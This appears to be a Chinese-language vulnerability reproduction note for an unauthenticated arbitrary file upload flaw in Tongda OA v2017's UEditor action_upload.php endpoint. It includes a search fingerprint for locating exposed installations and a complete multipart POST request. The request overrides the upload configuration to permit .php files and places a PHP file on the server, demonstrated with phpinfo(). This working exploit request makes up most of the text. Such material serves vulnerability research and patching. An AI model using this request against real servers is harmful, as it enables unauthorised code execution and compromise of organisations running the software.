# 通达OA v2017 action_upload.php 任意文件上传漏洞

## 漏洞描述

通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞

## 漏洞影响

<a-checkbox checked>通达OA v2017</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TDXK-通达OA" </a-checkbox></br>

## 漏洞复现

访问获取版本信息

![img](../../../.vuepress/public/img/1628301733285-a06c056e-4c78-4b77-bb05-bb01fef71ebc.png)

发送请求包上传任意文件

```php
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 893
Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
X_requested_with: XMLHttpRequest
Accept-Encoding: gzip

-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--
```

![img](../../../.vuepress/public/img/1628301944004-f70c17d1-14fa-4653-9888-720876947b7d.png)

再访问上传的文件 

![img](../../../.vuepress/public/img/1628301997079-6703e75c-6115-4f8a-a455-3e53054ce34a.png)